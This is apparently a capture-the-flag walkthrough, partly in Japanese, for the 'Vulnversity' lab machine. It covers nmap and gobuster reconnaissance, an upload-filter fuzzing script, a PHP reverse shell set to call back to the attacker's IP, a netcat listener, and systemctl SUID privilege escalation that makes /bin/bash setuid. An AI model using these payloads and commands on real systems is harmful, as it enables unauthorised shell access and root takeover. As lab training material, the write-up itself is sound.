# Reconnaissance

```sh
$ nmap -sV 10.10.182.55 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-09 15:47 EDT
Nmap scan report for 10.10.182.55
Host is up (0.075s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.21 seconds
```

# Scan the box; how many ports are open?

6

# What version of the squid proxy is running on the machine?

3.5.12

# How many ports will Nmap scan if the flag -p-400 was used?

```sh
$ nmap -sV 10.10.182.55 -p-400
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-09 15:51 EDT
Nmap scan report for 10.10.182.55
Host is up (0.031s latency).
Not shown: 397 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.95 seconds
```

400

# What is the most likely operating system this machine is running?

```sh
$ nmap -A 10.10.182.55        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-09 15:54 EDT
Nmap scan report for 10.10.182.55
Host is up (0.031s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2024-07-09T15:54:27-04:00
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2024-07-09T19:54:27
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h20m01s, deviation: 2h18m33s, median: 1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.33 seconds

$ sudo nmap -O 10.10.182.55    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-09 15:59 EDT
Nmap scan report for 10.10.182.55
Host is up (0.032s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes
Aggressive OS guesses: Linux 3.10 - 3.13 (96%), Linux 5.4 (96%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.39 seconds
```

Ubuntu

# What port is the web server running on?

3333

# What is the flag for enabling verbose mode using Nmap?

-v

# What is the directory that has an upload form page?

```sh
$ gobuster dir --url http://10.10.182.55:3333 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.182.55:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 320] [--> http://10.10.182.55:3333/images/]
/css                  (Status: 301) [Size: 317] [--> http://10.10.182.55:3333/css/]
/js                   (Status: 301) [Size: 316] [--> http://10.10.182.55:3333/js/]
/fonts                (Status: 301) [Size: 319] [--> http://10.10.182.55:3333/fonts/]
/internal             (Status: 301) [Size: 322] [--> http://10.10.182.55:3333/internal/]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```

/internal/

# What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.

```sh
$ cp /usr/share/webshells/php/php-reverse-shell.php .
```

ペイロードを自分のホストに書き換える。

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.23.8.118';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

httpieでリクエストを送信するテスト

```sh
$ http --multipart POST http://10.10.117.137:3333/internal/ file@'./php-reverse-shell.php' 
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 336
Content-Type: text/html; charset=UTF-8
Date: Fri, 02 Aug 2024 20:42:20 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding

<html>
<head>
<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
<style>
html, body {
    height: 30%;
}
html {
    display: table;
    margin: auto;
}
body {
    display: table-cell;
    vertical-align: middle;
    text-align: center;
}
</style>
</head>
<body>
<form action="index.php" method="post" enctype="multipart/form-data">
    <h3>Upload</h3><br />
    <input type="file" name="file" id="file">
    <input class="btn btn-primary" type="submit" value="Submit" name="submit">
</form>
Extension not allowed</body>
</html>
```

HTTPieを用いてファジングを行う攻撃用スクリプトを作成します。

今回は、特定の拡張子を持つファイルをサーバーにPOSTリクエストするファジングを行います。対象のファイルは`php-reverse-shell.php`で、このファイルを様々な拡張子に変換してテストします。

まず、以下の内容を持つ`phpext.txt`ファイルを作成します。このファイルにはテストする拡張子のリストを含めます。

```txt
.php
.php3
.php4
.php5
.phtml
```

次に、HTTPieを用いたファジングを行うBashスクリプト`script.sh`を作成します。このスクリプトは、`php-reverse-shell.php`を指定された拡張子に変換し、HTTP POSTリクエストを送信してレスポンスをチェックします。

```sh
#!/bin/bash

original_file="./php-reverse-shell.php"

while IFS= read -r ext; do
  temp_file="./php-reverse-shell$ext"
  
  cp "$original_file" "$temp_file"
  
  response=$(http --ignore-stdin --multipart POST http://10.10.117.137:3333/internal/ file@"$temp_file")
  
  if echo "$response" | grep -q "Extension not allowed"; then
    echo "Extension $ext: Not allowed"
  else
    echo "Extension $ext: Allowed"
  fi
  
  if [ "$ext" != ".php" ]; then
    rm "$temp_file"
  fi
done < phpext.txt
```

作成したスクリプトに実行権限を付与します。

```sh
$ chmod +x script.sh
```

スクリプトを実行すると、各拡張子に対してHTTPリクエストが実行され、そのレスポンスが「Extension not allowed」を含むかどうかがチェックされます。
結果は次のように出力されました。

```sh
$ ./script.sh                                        
cp: './php-reverse-shell.php' and './php-reverse-shell.php' are the same file
Extension .php: Not allowed
Extension .php3: Not allowed
Extension .php4: Not allowed
Extension .php5: Not allowed
Extension .phtml: Allowed
```

拡張子が`.phtml`のときAllowedらしい。

アップロードされたファイルがどこにあるか探す。

```sh
$ gobuster dir --url http://10.10.117.137:3333/internal/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.117.137:3333/internal/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 332] [--> http://10.10.117.137:3333/internal/uploads/]
/css                  (Status: 301) [Size: 328] [--> http://10.10.117.137:3333/internal/css/]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```

/uploads/にアップロードしたファイルがあることを確認。

リバースシェルをポート1234で待ち受ける。

```sh
$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.23.8.118] from (UNKNOWN) [10.10.24.247] 48060
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 17:01:57 up 12 min,  0 users,  load average: 0.00, 0.20, 0.30
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ pwd
/
$ cd /home
$ ls
bill
$ ls
user.txt
$ cat user.txt
8bd7992fbe8a6ad22a63361004cfcedb
```

# On the system, search for all SUID files. Which file stands out?

SUIDファイルを探す。

```sh
$ find / -user root -perm -4000 2>/dev/null       
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```

/bin/systemctlがSUIDファイルになっている。

# What is the root flag value?

`sudo`コマンドを実行してみたが、うまくいかない。

```sh
$ sudo -l
/bin/sh: 31: -l: not found
```

GTFObinsから`systemctl`のsudoを見つけて編集。

```sh
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
sudo systemctl link $TF
sudo systemctl enable --now $TF
```

以下のように書き換える。

```sh
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
```


